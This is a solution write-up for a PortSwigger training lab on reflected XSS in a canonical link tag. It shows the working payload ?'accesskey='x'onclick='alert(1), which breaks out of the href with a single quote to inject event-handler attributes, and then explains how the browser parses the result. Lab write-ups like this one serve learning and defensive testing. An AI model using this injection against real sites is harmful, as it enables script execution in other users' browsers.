# Lab 17: Reflected XSS in canonical link tag

**Category:** Cross-Site Scripting (XSS)  
**Difficulty:** Practitioner  
**Lab link:** [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)

## Overview

The page includes a `<link rel="canonical">` tag in the `<head>` that reflects the current URL in its `href` attribute. Angle brackets are encoded (no tag injection), but single quotes are not — allowing attribute injection on the `<link>` element itself.

## Key Concepts

- **Reflection in non-visible elements:** `<link>`, `<meta>`, `<base>` in `<head>` are invisible but still exploitable via attribute injection
- **`accesskey` attribute:** Makes any element — even invisible ones — activatable via keyboard shortcut
- **Single quote breakout:** Closing the `href` with `'` and injecting new attributes when `'` is not encoded

## Solution

1. Navigate to the lab and append the payload to the URL:

```
https://LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)
```

2. Press the accesskey combo to trigger:
   - **Windows/Linux Chrome:** `Alt + Shift + X`
   - **macOS Chrome:** `Ctrl + Alt + X`
   - **Firefox (all):** `Alt + Shift + X`

## Payload Breakdown

```
?'accesskey='x'onclick='alert(1)
```

The canonical tag becomes:
```html
<link rel="canonical" href="https://LAB-ID.../?'accesskey='x'onclick='alert(1)"/>
```

Browser parses as:
- `href='https://LAB-ID.../?'` — href closed by injected single quote
- `accesskey='x'` — assigns keyboard shortcut key `x`
- `onclick='alert(1)'` — fires when activated via the accesskey
